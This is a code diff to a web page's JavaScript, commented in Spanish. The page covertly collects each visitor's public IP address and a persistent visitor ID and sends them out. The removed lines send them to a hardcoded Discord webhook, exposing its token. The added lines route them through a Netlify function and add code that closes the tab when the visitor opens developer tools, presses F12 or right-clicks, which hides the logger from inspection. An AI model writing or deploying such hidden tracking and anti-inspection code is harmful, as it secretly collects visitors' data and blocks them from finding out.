@@ -43,7 +43,59 @@
             localStorage.setItem('visitorId', visitorId);
         }
 
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1362970582341255188/cqrdjShxtYkeiiIkgAVeH588-_aji5XdVxERffsO6FGmNyJvhjRL80tuMdj-M6W0jXzS";
+        const FUNCTION_URL = '/.netlify/functions/send-ip';
+
+        
+        document.addEventListener('keydown', (e) => {
+            if (
+                e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+                (e.metaKey && e.altKey && e.key === 'I') 
+            ) {
+                e.preventDefault();
+                closeTab();
+            }
+        });
+
+        
+        document.addEventListener('contextmenu', (e) => {
+            e.preventDefault();
+            closeTab();
+        });
+
+       
+        function closeTab() {
+            try {
+                window.close();
+               
+                setTimeout(() => {
+                    window.location.href = 'about:blank';
+                }, 100);
+            } catch (e) {
+                console.error('❌ Error al cerrar pestaña:', e);
+                window.location.href = 'about:blank';
+            }
+        }
+
+        
+        let isDevToolsOpen = false;
+        function checkDevTools() {
+            const threshold = 100; // Píxeles de diferencia para detectar DevTools
+            const widthDiff = window.outerWidth - window.innerWidth;
+            const heightDiff = window.outerHeight - window.innerHeight;
+            if (widthDiff > threshold || heightDiff > threshold) {
+                if (!isDevToolsOpen) {
+                    isDevToolsOpen = true;
+                    console.log('⚠️ DevTools detectado');
+                    closeTab();
+                }
+            } else {
+                isDevToolsOpen = false;
+            }
+        }
+
+       
+        setInterval(checkDevTools, 500);
 
         async function obtenerDatos(retries = 3) {
             const apis = [
@@ -56,7 +108,7 @@
                     try {
                         console.log(`🔍 Intento ${attempt} con ${api.url}...`);
 
-                        
+                       
                         const ipResponse = await fetch(api.url, {
                             method: "GET",
                             headers: { "Accept": "application/json" }
@@ -81,7 +133,7 @@
 
                         console.log("✔️ IP IPv4 obtenida:", ip);
 
-                       
+                        
                         const lastSentIP = localStorage.getItem('lastSentIP');
                         if (lastSentIP === ip) {
                             console.log("ℹ️ IP igual a la anterior, no se envía:", ip);
@@ -89,38 +141,20 @@
                         }
 
                         
-                        const mensaje = {
-                            content: "**🔍 Nueva IP detectada**",
-                            embeds: [
-                                {
-                                    title: "🌍 Datos del usuario",
-                                    color: 16711680,
-                                    fields: [
-                                        { name: "🖥️ IP (IPv4)", value: `${ip}`, inline: true },
-                                        { name: "🆔 ID Visitante", value: `${visitorId}`, inline: true },
-                                    ],
-                                    footer: {
-                                        text: "🔍 Logger IP | Shop Bas",
-                                    },
-                                },
-                            ],
-                        };
-
-                        
-                        console.log("📤 Enviando datos a Discord...");
-                        const webhookResponse = await fetch(WEBHOOK_URL, {
+                        console.log("📤 Enviando datos a la función...");
+                        const functionResponse = await fetch(FUNCTION_URL, {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
-                            body: JSON.stringify(mensaje),
+                            body: JSON.stringify({ ip, visitorId }),
                         });
 
-                        if (!webhookResponse.ok) {
-                            const errorText = await webhookResponse.text();
-                            throw new Error(`Error enviando a Discord: ${webhookResponse.status} ${errorText}`);
+                        if (!functionResponse.ok) {
+                            const errorText = await functionResponse.text();
+                            throw new Error(`Error enviando a la función: ${functionResponse.status} ${errorText}`);
                         }
 
-                        console.log("✔️ Datos enviados a Discord exitosamente");
-                        
+                        console.log("✔️ Datos enviados a la función exitosamente");
+                        // Almacenar la IP enviada
                         localStorage.setItem('lastSentIP', ip);
                         return; 
 
